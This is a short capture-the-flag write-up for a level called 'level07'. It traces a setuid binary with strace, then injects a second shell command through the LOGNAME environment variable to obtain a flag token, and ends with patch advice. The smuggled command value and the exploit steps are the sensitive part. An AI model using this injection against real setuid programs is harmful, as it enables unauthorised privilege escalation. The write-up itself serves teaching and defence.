## level07

- **How we found it**

	Traced execution with `strace` and saw it invoking `sh -c` with an `echo` of the current user name:

	```bash
	strace ./level07 2>&1 | grep execve
	# execve("/bin/sh", ["sh","-c","/bin/echo level07 "], [/* vars */]) = 0
	```

- **How we exploited it**

	**1.** Inject a shell command via the LOGNAME environment variable (default "level07"):

	```bash
	export LOGNAME='level07 | getflag'
	```


	**2.** Run the setuid binary:

	```bash
	./level07
	# Check flag. Here is your token: fiumuikeil55xe9cu4dood66h
	```

- **Utility of this exercise**

	Demonstrates how untrusted environment variables in setuid programs can lead to command injection and privilege escalation.

- **How to patch**

	- Do not use user‑controlled environment variables in shell invocations.

	- Clear or sanitize the environment in setuid binaries, or remove the setuid bit if unnecessary.
